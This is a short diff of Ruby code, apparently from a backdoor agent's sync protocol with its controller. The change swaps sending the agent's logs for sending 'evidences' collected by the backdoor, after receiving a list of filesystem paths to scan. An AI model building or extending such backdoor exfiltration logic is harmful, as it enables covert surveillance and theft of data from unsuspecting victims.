@@ -69,8 +69,8 @@ class Protocol
       # receive the list of paths to be scanned
       receive_filesystems if available.include? PROTO_FILESYSTEM
       
-      # send the agents' logs
-      send_logs @sync.backdoor.logs unless @sync.backdoor.logs.empty?
+      # send the agent's collcted evidences
+      send_evidences @sync.backdoor.evidences unless @sync.backdoor.evidences.empty?
       
       # terminate the protocol
       bye
